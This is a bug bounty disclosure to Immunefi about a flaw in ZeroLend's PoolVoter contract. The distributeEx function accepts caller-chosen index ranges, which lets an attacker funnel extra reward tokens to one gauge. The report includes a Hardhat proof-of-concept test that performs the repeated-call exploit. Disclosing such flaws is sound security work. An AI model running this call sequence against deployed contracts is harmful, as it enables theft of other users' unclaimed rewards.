# 28988 - \[SC - High] Mechanism for distributing extra reward tokens ...

Submitted on Mar 4th 2024 at 04:07:39 UTC by @MahdiKarimi for [Boost | ZeroLend](https://immunefi.com/bounty/zerolend-boost/)

Report ID: #28988

Report type: Smart Contract

Report severity: High

Target: <https://github.com/zerolend/governance>

Impacts:

* Theft of unclaimed yield

## Description

## Brief/Intro

PoolVoter mechanism for distributing additional reward tokens is vulnerable and allows an attacker transfer all additional reward tokens to a desirable gauge in favor of himself.

## Vulnerability Details

PoolVoter has 2 diffrent mechanism for distributing rewards, first is simple distribution which is intended to distribute main reward token, also there is a mechanism to distribute additional rewards other than main reward token through `distributeEx` function, in this implementation additional reward token balance of PoolVoter has been distributed to different gauges proportion to each gauge weight and totalWeight, `distributeEx` enables users to choose which pools to distribute rewards by start and end parameters, this creates a situation which enables malicious user to distribute rewards to one gauge in favor of himself and call this function again to distribute remaining balance again, and repeat this process to transfer almost all reward tokens to a specific gauge. It is recommended to ensure `distributeEx` iterates through all pools and transfers additional rewards at once.

## Impact Details

It enables a malicious user to transfer all additional reward tokens to one specific gauge in favor of himself, this is considered a theft of unclaimed yield.

## References

<https://github.com/zerolend/governance/blob/a30d8bb825306dfae1ec5a5a47658df57fd1189b/contracts/voter/PoolVoter.sol#L214-L234>

## Proof of Concept

```
  describe("transfer additional rewards test", () => {
    it("Malicious user can transfer all additional rewards to a speciefic gauge", async function () {
    
    // NOTE: this test works with https://github.com/zerolend/governance/commit/4c18c037bd3360ec7316733478b67632fb5218c9 commit 
    // tests didn't work at latest commit, however there is no change at pool voter other than changing some variable names between two commits 
    // so there is no differece 
    // some parts has been added to deployement as follow
    // a new lending pool has been deployed during deployment and its gauge has been registered at pool voter during deployment 
    // some zero tokens has been transferred to ant.address, so ant.address have enough zero token balance 
    // there is an issue at line 136 of PoolVoter by missing a ! sign, which prevents adding pools to _pool array and preventing distribute rewards 
    // since this issue relates to distributing rewards I needed to fix that so distribute function works by fixing if statement 
    // however I submitted that issue seperately and its different from this issue 

    // voting to both gauges equally 
    let vote1 = 1e8/2;
    let vote2 = 1e8/2; 
    await poolVoter.connect(ant).vote([reserve.target, reserve2.target],[vote1, vote2]);
   
    // we consider zero is additional reward token of the pool voter ( not main reward token ) 
    // transferring rewards to pool voter 
    await zero.connect(ant).transfer(poolVoter.target, 1e6);

    // retrieve pool voter contract balance 
    let balance0 = await zero.balanceOf(poolVoter);

    // call distributeEx with start:0 and end:1 so rewards would be distributed only to fisrt gauge  
    // since first gauge has half of total weight so it would receive half of balance 
    await poolVoter["distributeEx(address,uint256,uint256)"](zero.target, 0,1);

    // we call it again so half of remaining balance would be distributed to first gauge again 
    // this process can be repeated to transfer all additional rewards to one gauge 
    await poolVoter["distributeEx(address,uint256,uint256)"](zero.target, 0,1);

    // we can see that half 
    let balanceAfter = await zero.balanceOf(poolVoter);
    expect(balanceAfter).lessThan(balance0);

    });
  });
```
